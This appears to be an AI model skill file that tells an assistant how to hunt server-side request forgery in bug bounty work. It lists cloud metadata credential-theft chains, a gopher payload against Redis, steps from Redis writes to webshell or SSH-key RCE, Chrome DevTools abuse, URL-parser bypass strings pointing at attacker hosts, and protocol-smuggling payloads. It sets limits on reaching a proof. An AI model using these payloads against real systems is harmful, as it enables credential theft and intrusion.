---
description: "SSRF hunting methodology. TRIGGER: user is testing for server-side request forgery, blind SSRF, cloud metadata access, internal port scanning, URL parser abuse, webhook callbacks, PDF/image fetcher abuse, or DNS rebinding."
---

# /hunt-ssrf - Server-Side Request Forgery Hunting

You are assisting **Liodeus (YesWeHack)**, whose SSRF reports include cloud metadata → IAM credential theft, headless-Chrome SSRF → internal services, DNS rebinding bypassing allowlists, and gopher-protocol abuse against internal Redis. **SSRF is a pivot primitive** — by itself it's medium; chained to internal services it's critical.

## Core Philosophy

Every modern app has 5+ SSRF surfaces and you'll miss 4 of them. They live in:
- **URL inputs** the user controls (webhook, avatar URL, import-from-URL, OAuth callback)
- **URL inputs the user controls indirectly** (HTML→PDF, screenshot service, link unfurling, RSS reader, OG tag fetcher)
- **URL inputs the user doesn't know exist** (server-side image proxy, video transcoder, file format converter)

The first kind is obvious. The second kind is where the wins live. Always look for **headless browser chains**: HTML/PDF/screenshot rendering = JS execution server-side = SSRF + more.

## SSRF Chains (from real reports)

### Chain 1: AWS metadata → IAM creds → S3/cluster access
1. Confirm SSRF reaches `http://169.254.169.254/`
2. IMDSv1: `GET /latest/meta-data/iam/security-credentials/<role>` → AccessKey/Secret/Token
3. IMDSv2: must `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds` first — many SSRF primitives can't do PUT, but PDF generators / headless browsers CAN
4. Use creds with `aws sts get-caller-identity`, `aws s3 ls`, etc.
5. Stop at proof. Do not exfil customer data.

### Chain 2: GCP / Azure / Alibaba / Oracle metadata
* GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header — many SSRF can set headers)
* Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header)
* Alibaba: `http://100.100.100.200/latest/meta-data/`
* Oracle: `http://192.0.0.192/opc/v1/instance/`
* DigitalOcean: `http://169.254.169.254/metadata/v1/`

### Chain 3: Internal port scan / service discovery
1. Probe common internal services: 22, 80, 443, 3306, 5432, 6379, 8080, 8500 (consul), 8888, 9200 (es), 27017 (mongo)
2. Differentiate via response time / status / body
3. Pivot to known internal services for the cloud (cloudprovider-specific service IPs)

### Chain 4: Gopher protocol → internal Redis / SMTP / mysql
1. If `gopher://` is allowed (curl/libcurl backends often allow it)
2. Craft Redis: `gopher://10.0.0.5:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a` (don't actually flushall — use `info` or `dbsize` for proof)
3. Redis SET to write SSH keys / cron / webshell → RCE
4. SMTP: send mail from internal mail relay (spoof internal sender for phishing pretext)

### Chain 5: DNS rebinding bypassing allowlists
1. Target validates URL by resolving DNS, checks IP is public, fetches URL
2. Use a rebind domain (`rbndr.us`, `rebind.it`, custom 2-record domain): first lookup returns public IP, second returns 169.254.169.254
3. Tools: `singularity` (NCC Group), custom CoreDNS with TTL=0
4. Works against URL libraries that resolve twice (validate then fetch)

### Chain 6: Headless Chrome → Chrome DevTools Protocol
(Chains into RCE — see /hunt-rce)
1. HTML→PDF or screenshot service
2. Inject JS that scans localhost for Chrome debug port (often 9222 or randomized 30000-50000)
3. Fetch `/json` to get WebSocket debug URL
4. Use CDP over WS to read local files, eval code, escape sandbox
5. Read `/var/run/secrets/kubernetes.io/serviceaccount/token` if in K8s

### Chain 7: URL parser confusion
Different libraries parse URLs differently. Common bypasses:
* `http://allowed.com@attacker.com/` (basic-auth confusion)
* `http://attacker.com#@allowed.com/`
* `http://allowed.com.attacker.com/`
* `http://allowed.com\@attacker.com/`
* `http://127.0.0.1:80@allowed.com/`
* IPv6: `http://[::ffff:127.0.0.1]/`
* Decimal/Octal/Hex IP: `http://2130706433/`, `http://0x7f000001/`, `http://017700000001/`
* Short forms: `http://127.1/`, `http://0/`
* Punycode/IDN: `http://xn--...`
* Trailing dot: `http://allowed.com./`
* Path normalization: `http://attacker.com/?host=allowed.com`

### Chain 8: Protocol smuggling
* `file:///etc/passwd`
* `dict://internal:11211/stats`
* `ldap://internal:389`
* `ftp://attacker.com/` (some libs reuse connection)
* `jar:http://attacker.com/x.zip!/` (Java)

## Discovery Methodology

### Step 1: Find the URL inputs
* Direct: webhook URL, OAuth callback, avatar/image URL, RSS feed, import-from-URL, link preview, OG fetcher, sitemap importer, SSO metadata URL
* Indirect: HTML→PDF, HTML→screenshot, file converter, "Share via email"
* Hidden: SAML metadata, OIDC discovery, federation endpoints, software updates, license check

### Step 2: For each input, run the test ladder
1. Submit `https://your-collaborator.example.com/PATH` — does the server fetch?
2. Capture User-Agent, source IP, headers — fingerprints the fetcher (curl, wget, Java, Go-http-client, Headless Chrome)
3. Test redirects: collaborator returns 301→`http://169.254.169.254/...` — does it follow?
4. Test cross-protocol redirect: HTTPS→HTTP, HTTP→file://, HTTP→gopher://
5. Test internal IP directly: `http://169.254.169.254/`, `http://localhost/`, `http://127.0.0.1:port/`
6. Test parser bypasses (above)
7. Test DNS rebinding if simple bypasses fail

### Step 3: Identify the fetcher
The User-Agent tells you the library — that tells you what tricks work:
* `curl/x.y.z` — supports gopher, dict, file (often)
* `Go-http-client/1.1` — strict, but follows redirects; check for `httputil.ReverseProxy` patterns
* `Java/x.y` — `jar://` may work; SSRF in `URLConnection`
* `python-requests/x.y` — predictable; test redirects
* `HeadlessChrome/x.y` — full browser, JS exec, CDP chains apply
* `node-fetch/x.y` / `axios/x.y` — JS-based, often follow redirects unconditionally

### Step 4: Confirm internal access
* If you got a hit on `169.254.169.254`, capture metadata and stop
* If port-scanning, start with cloud-provider-specific internal services (e.g. AWS RDS endpoints, internal ELBs)
* For PDF/Chrome SSRF: use `<iframe src=...>` or `<img src=...>` inside the rendered HTML — the renderer fetches them server-side

## Impact Demonstration

* Show the request that triggered the SSRF
* Show the response containing internal data (metadata, internal endpoint body, port-scan timing)
* For credentials: show `aws sts get-caller-identity` (or equiv) — DO NOT use the credentials beyond identity verification
* Categorize: blind (only collaborator hit), semi-blind (timing/error), full read SSRF
* Document which protocols / IPs are reachable

## Key Considerations

* IMDSv1 is the easy win on AWS — IMDSv2 requires PUT capability (most SSRF can't do PUT, but headless browsers and full URL libs can)
* Always test the redirect path — many apps validate the URL once, then `requests.get(...follow_redirects=True)` happily follows to internal IPs
* For blind SSRF, time-based detection (probe a known-closed port vs a known-open one) is your best friend
* `0.0.0.0` is often equivalent to `127.0.0.1` and bypasses naive `127.*` blocklists
* On K8s, the pod usually has access to: cluster API, kube-dns, sidecar proxy (Envoy/Istio admin port 15000), and any in-namespace services
* Don't actually scan customer infra at scale — proof of one or two internal services is enough
